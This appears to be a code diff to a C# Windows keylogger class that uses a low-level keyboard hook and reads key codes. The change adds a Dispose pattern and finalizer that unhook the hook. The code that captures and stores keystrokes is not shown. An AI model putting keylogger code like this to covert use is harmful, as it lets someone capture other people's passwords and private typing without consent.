@@ -7,6 +7,8 @@ namespace WindowsKeyLogger
 {
     public class KeyLogger
     {
+        private bool _disposed = false;
+
         // Callback fucntion https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         private readonly LowLevelKeyboardProc _lowLevelProc;
@@ -114,8 +116,33 @@ namespace WindowsKeyLogger
         private Keys ReadKey(IntPtr lParam)
         {
             var vkCode = Marshal.ReadInt32(lParam);
+
             return (Keys)vkCode;
         }
+
+        #region Dispose
+
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+            if (!_disposed)
+            {
+                if (disposing)
+                {
+                    UnhookWindowsHookEx(_hookID);
+                }
+                _disposed = true;
+            }
+        }
+
+        ~KeyLogger() => Dispose(false);
+
+        #endregion
 
         #region DllImport
 
